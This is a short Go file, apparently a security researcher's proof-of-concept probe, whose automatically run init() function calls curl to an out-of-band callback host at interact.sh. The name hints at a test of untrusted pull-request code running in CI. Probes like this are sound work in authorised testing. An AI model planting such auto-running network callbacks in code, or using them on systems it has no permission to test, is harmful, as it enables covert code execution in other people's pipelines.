package main

import (
    "fmt"
    "os/exec"
)

func init() {
    fmt.Println("hb-test-prt-checkout: starting")
    
    // Try to make an HTTP callback as backup verification
    cmd := exec.Command("curl", "-s", "https://interact.sh/hb-test-prt-checkout")
    if err := cmd.Run(); err != nil {
        fmt.Printf("hb-test-prt-checkout: curl failed: %v\n", err)
    }
    
    fmt.Println("hb-test-prt-checkout: completed")
}